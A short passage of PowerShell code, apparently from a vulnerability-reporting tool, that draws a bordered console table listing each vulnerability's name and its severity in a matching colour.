        Write-Host -ForegroundColor White "$($HeavyVerticalAndRight)$("$($HeavyHorizontal)" * 62)$($HeavyVerticalAndLeft)"

        foreach ($Vulnerability in $Vulnerabilities) {

            $SeverityColor = Get-SeverityColor -Severity $($Vulnerability.Severity -as $script:SeverityLevel)
            $ResultString = "- $($Vulnerability.DisplayName) $($RightwardsArrow) $($Vulnerability.Severity -as $script:SeverityLevel)"

            Write-Host -NoNewline -ForegroundColor White "$($HeavyVertical) -"
            Write-Host -NoNewLine " $($Vulnerability.DisplayName) $($RightwardsArrow)"
            Write-Host -NoNewLine -ForegroundColor $SeverityColor " $($Vulnerability.Severity -as $script:SeverityLevel)"
            Write-Host -ForegroundColor White "$(" " * (62 - $ResultString.Length - 1))$($HeavyVertical)"
        }
    }

    Write-Host -ForegroundColor White "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
    Write-Host ""
}